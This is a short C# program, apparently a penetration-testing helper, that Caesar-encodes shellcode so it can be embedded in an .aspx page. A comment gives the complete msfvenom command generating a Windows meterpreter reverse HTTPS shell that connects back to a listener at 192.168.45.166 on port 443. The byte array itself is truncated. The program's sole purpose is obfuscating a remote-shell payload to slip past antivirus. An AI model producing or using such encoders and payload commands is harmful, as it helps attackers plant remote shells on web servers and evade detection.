using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

//For creating the caesar ciphered payload for .aspx
namespace aspxEncoderApp
{
    class Program
    {
        static void Main(string[] args)
        {
            //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.166 LPORT=443 -f csharp -exitfunc=thread

            byte[] buf = new byte[809] {0xfc,0x48, ... 0xd5};

            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 5) & 0xFF);
            }

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2},", b);
            }

            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}
